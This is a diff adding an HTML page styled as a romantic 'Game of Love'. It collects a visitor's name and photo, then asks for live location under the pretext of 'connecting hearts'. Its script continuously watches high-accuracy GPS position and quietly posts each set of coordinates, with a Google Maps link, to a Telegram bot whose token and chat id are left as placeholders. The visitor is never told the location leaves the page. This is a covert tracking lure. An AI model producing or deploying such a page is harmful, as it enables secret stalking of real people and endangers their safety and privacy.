@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Game of Love</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #ffe6f0;
+      color: #b30059;
+      text-align: center;
+      padding: 40px;
+    }
+    .hidden { display: none; }
+    .love-animation {
+      font-size: 3em;
+      font-weight: bold;
+      color: #e60073;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { color: #e60073; transform: scale(1); }
+      50% { color: #ff3399; transform: scale(1.2); }
+      100% { color: #e60073; transform: scale(1); }
+    }
+    input[type="text"], input[type="file"] {
+      font-size: 1.2em;
+      padding: 8px;
+      border: 2px solid #e60073;
+      border-radius: 5px;
+    }
+    button {
+      margin-top: 15px;
+      font-size: 1.2em;
+      background-color: #e60073;
+      border: none;
+      color: white;
+      padding: 10px 25px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #ff3399;
+    }
+    #userPhoto {
+      margin-top: 20px;
+      max-width: 300px;
+      border-radius: 15px;
+      border: 2px solid #e60073;
+    }
+    .beauty-text {
+      font-size: 2em;
+      color: #cc0066;
+      animation: fadeIn 2s ease-in-out infinite alternate;
+      margin-top: 20px;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0.2; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1.05); }
+    }
+  </style>
+</head>
+<body>
+
+<div id="welcomeScreen">
+  <div class="love-animation">Welcome, My Love!</div>
+  <button onclick="showNameInput()">Start</button>
+</div>
+
+<div id="nameScreen" class="hidden">
+  <h2>Type Your Name</h2>
+  <input type="text" id="loverName" placeholder="Your name..." />
+  <br />
+  <button onclick="submitName()">Submit</button>
+</div>
+
+<div id="photoScreen" class="hidden">
+  <h2>Welcome my love, <span id="showName"></span></h2>
+  <p>Please upload your beautiful photo</p>
+  <input type="file" accept="image/*" id="photoInput" />
+  <br />
+  <button onclick="submitPhoto()">Continue</button>
+</div>
+
+<div id="locationScreen" class="hidden">
+  <h2>Allow Live Location Access</h2>
+  <p>This page wants to access your location to connect hearts.</p>
+  <button onclick="getLocation()">Allow Location</button>
+</div>
+
+<div id="finalScreen" class="hidden">
+  <div class="beauty-text">You have infinite beauty, my love <span id="showNameFinal"></span></div>
+  <img id="userPhoto" />
+</div>
+
+<script>
+  function showNameInput() {
+    document.getElementById('welcomeScreen').classList.add('hidden');
+    document.getElementById('nameScreen').classList.remove('hidden');
+  }
+
+  function submitName() {
+    const nameInput = document.getElementById('loverName').value.trim();
+    if (nameInput === '') {
+      alert('Please enter your name!');
+      return;
+    }
+    window.loverName = nameInput;
+    document.getElementById('nameScreen').classList.add('hidden');
+    document.getElementById('showName').textContent = window.loverName;
+    document.getElementById('photoScreen').classList.remove('hidden');
+  }
+
+  function submitPhoto() {
+    const photoInput = document.getElementById('photoInput');
+    if (!photoInput.files || photoInput.files.length === 0) {
+      alert('Please upload a photo!');
+      return;
+    }
+    const file = photoInput.files[0];
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      window.userPhotoURL = e.target.result;
+      document.getElementById('photoScreen').classList.add('hidden');
+      document.getElementById('locationScreen').classList.remove('hidden');
+      document.getElementById('showNameFinal').textContent = window.loverName;
+    };
+    reader.readAsDataURL(file);
+  }
+
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition(showPosition, showError, { enableHighAccuracy: true });
+    } else {
+      alert('Geolocation is not supported by your browser.');
+    }
+  }
+
+  function showPosition(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    sendToTelegram(lat, lon); // send location to Telegram
+
+    document.getElementById('locationScreen').classList.add('hidden');
+    document.getElementById('finalScreen').classList.remove('hidden');
+    document.getElementById('userPhoto').src = window.userPhotoURL;
+  }
+
+  function showError(error) {
+    alert('Error getting location: ' + error.message);
+  }
+
+  function sendToTelegram(lat, lon) {
+    const botToken = "YOUR_BOT_TOKEN_HERE";  // Replace this
+    const chatId = "YOUR_CHAT_ID_HERE";      // Replace this
+    const message = `New location received:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+  }
+</script>
+
+</body>
+</html>
